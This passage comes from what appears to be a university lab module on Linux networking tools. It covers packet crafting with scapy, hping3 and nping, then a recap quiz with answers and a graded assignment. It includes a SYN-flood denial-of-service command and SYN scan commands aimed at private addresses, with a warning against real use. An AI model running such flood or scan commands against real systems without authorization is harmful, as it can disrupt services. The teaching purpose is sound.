send(IP(dst="192.168.1.1")/TCP(dport=80, flags="S"))
```

✅ Ideal for **testing firewalls**, crafting **malformed packets**, or **learning protocols**.

---

#### 🧪 Tool: `hping3` – TCP/IP Packet Generator

Install:

```bash
sudo apt install hping3
```

Send TCP SYN scan:

```bash
sudo hping3 -S 192.168.1.1 -p 80
```

Simulate DoS:

```bash
sudo hping3 --flood -S -p 80 192.168.1.1
```

✅ Use for **firewall testing**, **port scanning**, **DoS simulations**

⚠️ Don’t use `--flood` on real systems.

---

#### 🧪 Tool: `nping` – Nmap’s Packet Pinger

Install:

```bash
sudo apt install nmap
```

Run:

```bash
nping --tcp -p 80 192.168.1.1
```

Use it to:

* Measure response latency
* Test packet filtering
* Simulate traffic

---

### 🎯 Packet Crafting Challenge

Simulate traffic and observe using `tcpdump` or `wireshark`:

1. In terminal A:

```bash
sudo tcpdump -i any port 80
```

2. In terminal B:

```bash
sudo hping3 -S -p 80 localhost
```

✅ Observe SYN packets in tcpdump.

Now try:

```bash
sudo scapy
send(IP(dst="127.0.0.1")/UDP(dport=53))
```

---

### 🔐 Cybersecurity Use Cases

| Tool      | Use Case                                     |
| --------- | -------------------------------------------- |
| `nmap`    | Port scanning, service discovery             |
| `masscan` | Fast scans for large networks                |
| `hping3`  | IDS/IPS testing, firewall audit, DoS testing |
| `scapy`   | Deep protocol fuzzing and analysis           |
| `nikto`   | Vulnerability scanning on web servers        |
| `amass`   | External footprint and DNS reconnaissance    |

---

### ✅ Summary

You learned how to:

* Identify **open ports and services**
* Simulate **real-world traffic and attacks**
* Use advanced tools for **red/blue team exercises**

> Mastering these tools helps you **think like an attacker**, so you can **defend like a pro**.

---
## ✅ Summary – Networking Tools in Linux

Over this session, you learned to:

🧠 Understand the **categories** of networking tools and what they’re used for:

| Category         | Use Case                                      |
| ---------------- | --------------------------------------------- |
| Connectivity     | Test reachability and basic network health    |
| Routing Tables   | Understand how traffic flows and troubleshoot |
| Ports & Services | Discover open ports and running processes     |
| DNS & Hostnames  | Resolve names and investigate DNS behavior    |
| Traffic Capture  | Inspect and analyze raw packet data           |
| Sockets & Data Transfer | Test services, move files, simulate sessions |
| Bandwidth Monitor| Detect bottlenecks, monitor live throughput   |
| Security Scanners| Scan for open ports, discover vulnerabilities |
| Packet Crafting  | Simulate or test crafted packets and behaviors|

🧪 You ran hands-on labs using tools like:
- `ping`, `traceroute`, `ss`, `netstat`, `dig`, `tcpdump`, `nmap`, `curl`, `wireshark`, `iftop`, `hping3`, `scapy`, `nc`, `socat`, `amass`, and more.

🔐 You learned how attackers and defenders **use the same tools** — what matters is **intent, access, and detection**.

🛡️ You saw how **monitoring, probing, and crafting** network packets helps uncover threats, detect anomalies, and understand system behavior.

---

### 🏁 Challenge for Practice

Run the following tools and reflect:

```text
ping google.com
traceroute 8.8.8.8
ss -tuln
sudo tcpdump -i any -c 10
curl http://example.com
sudo nmap -sS 127.0.0.1
````

> Write a short description of what each command does and what output you see.

---
## 📣 Next Session Preview: Bash Scripting for Security

* Learn to automate scanning, logging, and alerting
* Build basic scripts for monitoring network changes
* Hands-on Bash scripting for analysts and admins

---

# ✅ Recap Quiz: Tools & Use Cases

Use this to test your knowledge before moving to the assignment. Toggle each item to see the answer.

---

### 📘 Section A – True/False

**Q1:** `ping` can help identify if a host is online and measure network latency.

<details><summary>✅ Show Answer</summary>
<p><strong>True</strong>  
`ping` sends ICMP echo requests and calculates round-trip time to check host availability and latency.</p>
</details>

---

**Q2:** The `netstat` command has been deprecated and should not be used on modern Linux systems.

<details><summary>✅ Show Answer</summary>
<p><strong>True</strong>  
`netstat` is deprecated in favor of tools like `ss`, which provide more detailed and faster output.</p>
</details>

---

### 📝 Section B – Multiple Choice

**Q3:** Which tool is best for monitoring open network connections?

A. `ip`
B. `netstat`
C. `ss`
D. `whoami`

<details><summary>✅ Show Answer</summary>
<p><strong>Answer: C. ss</strong>  
`ss` shows socket statistics, making it a faster and more powerful alternative to `netstat`.</p>
</details>

---

**Q4:** What does `tcpdump` primarily do?

A. Modify routing tables
B. Display web traffic
C. Capture packets from network interfaces
D. Test DNS resolution

<details><summary>✅ Show Answer</summary>
<p><strong>Answer: C. Capture packets from network interfaces</strong></p>
</details>

---

**Q5:** Which command resolves DNS queries?

A. `ip a`
B. `traceroute`
C. `dig`
D. `top`

<details><summary>✅ Show Answer</summary>
<p><strong>Answer: C. dig</strong>  
`dig` queries DNS servers and shows detailed resolution info, including authoritative servers.</p>
</details>

---

### 🔍 Section C – Short Answer

**Q6:** Why might `traceroute` be helpful in a security investigation?

<details><summary>✅ Show Answer</summary>
<p><strong>It reveals the path packets take across the network</strong>, helping detect rerouting, dropped hops, or interference by attackers (e.g. in a man-in-the-middle attack).</p>
</details>

---

**Q7:** What is the difference between `iftop` and `ip a`?

<details><summary>✅ Show Answer</summary>
<p><strong>`iftop` shows real-time bandwidth usage</strong> by connection, while `ip a` only shows interface addresses and status — not traffic or throughput.</p>
</details>

---

# 📂 Assignment: Network Tools in Practice

### 🎯 Goal

Use real tools to explore, analyze, and document network activity and device configuration.

---

### 📋 Tasks

#### 🖥️ Part 1: Interface Discovery

* Run `ip a` and `ifconfig`
* Submit:

  * All active interfaces
  * Assigned IPs
  * Loopback interface address
  * MAC address of at least one interface

---

#### 🌐 Part 2: Host Reachability

* Use `ping` on:

  * `8.8.8.8`
  * `www.niu.edu`
* Capture:

  * Round-trip time
  * Packet loss percentage (if any)

---

#### 🔎 Part 3: Network Connections

* Use `ss -tuln` and `netstat -tulnp`
* List:

  * All open TCP/UDP ports
  * Associated services (e.g., ssh, nginx)
  * Any listening services on `0.0.0.0` (all interfaces)

---

#### 🧠 Part 4: DNS Query & Analysis

* Use `dig` to look up:

  * `www.google.com`
  * Include the output sections:

    * ANSWER SECTION
    * AUTHORITY SECTION (if present)

---

#### 🧰 Part 5: Packet Capture (Wireshark or tcpdump)

* Start Wireshark or use:

  ```bash
  sudo tcpdump -i <interface> -n -c 20
  ```
* While browsing a webpage or pinging:

  * Filter traffic by `icmp` or `http`
  * Submit a screenshot and describe what you captured

---

#### 📘 Part 6: Reflection Essay

Write 150–200 words:
**“How can these Linux tools help identify abnormal network behavior or early signs of compromise?”**
Include at least one scenario from real life or theoretical examples (e.g., unusual open ports, packet floods, DNS hijacking).

---

### 📤 Submission Guidelines

* Combine all tasks, screenshots, and the essay into a single `.pdf`, `.docx`, or `.md` file
* Filename: `CSCI497_Lab6_Tools_YourName.pdf`
* Submit via LMS or instructor’s email

⏰ **Deadline: Monday, July 21, 2025 – 23:59 CEST** via blackboard or email

---

# Course Contents

* [Introduction to Computer Science](https://md.sigma2.no/s/MomJbiTBD)
* [Introduction to Algorithms and Data Structures](https://md.sigma2.no/s/p9pohYQeM)
* [Linux Commands and Process Management](https://md.sigma2.no/s/fliegCaRR)
* [Process Management and Memory Management](https://md.sigma2.no/s/b26-DDUqc)
* [IP Addressing and Networking Protocols](https://md.sigma2.no/s/z3c3xEFLa)
* [Subnetting and Routing Basics](https://md.sigma2.no/s/wWsEmuCTL)
* [Networking Tools in Linux](https://md.sigma2.no/s/HA4UFq4ey)
* [Cybersecurity Principles and Practices](https://md.sigma2.no/s/MxtF8r8ym)
* [Advanced Linux System Administration](https://md.sigma2.no/s/C7V0Ce6qk)
 
---


 
